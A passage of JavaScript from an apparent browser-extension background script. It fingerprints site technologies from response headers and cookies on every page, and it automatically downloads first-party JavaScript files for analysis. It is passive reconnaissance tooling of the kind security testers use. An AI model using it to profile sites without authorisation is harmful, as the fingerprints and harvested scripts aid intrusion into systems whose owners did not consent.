      if (details.type !== 'main_frame') return { responseHeaders: details.responseHeaders }
      const tabId = details.tabId
      if (tabId && tabId > 0) {
        const t = T(tabId)
        const fps = processHeaders(details.responseHeaders || [], tabId)
        for (const fp of fps) {
          if (!t.fw.some(f => f.key === fp.name.toLowerCase())) {
            t.fw.push({ name: fp.name, key: fp.name.toLowerCase(), prefix: '', score: 80 })
          }
        }
        // Cookie识别
        const cookieHeader = (details.responseHeaders || []).find(h => h.name.toLowerCase() === 'set-cookie')
        if (cookieHeader) {
          const cookieFps = processCookies(cookieHeader.value)
          for (const cfp of cookieFps) {
            if (!t.fw.some(f => f.key === cfp.name.toLowerCase())) {
              t.fw.push({ name: cfp.name, key: cfp.name.toLowerCase(), prefix: '', score: 70 })
            }
          }
        }
        badge(tabId)
      }
      return { responseHeaders: details.responseHeaders }
    },
    { urls: ['<all_urls>'] },
    ['responseHeaders']
  )

  // 拦截JS请求,自动下载分析
  chrome.webRequest.onBeforeRequest.addListener(
    details => {
      const { tabId, url, type } = details
      if (type !== 'script' || tabId < 0 || !url.startsWith('http') || isThirdParty(url)) return
      // 跨 tab 去重: content.js passive 已下载过的 JS, webRequest 不再重复触发
      if (downloadedUrls.has(url)) return
      const fetching = getFetching(tabId)
      if (fetching.has(url)) return
      fetching.add(url)
      const t = T(tabId)
      t.jsN = (t.jsN || 0) + 1
      badge(tabId)
      // async download — don't block the listener
      downloadJS(tabId, [url]).catch(() => {})
    },
    { urls: ['<all_urls>'] },
    []
  )
}
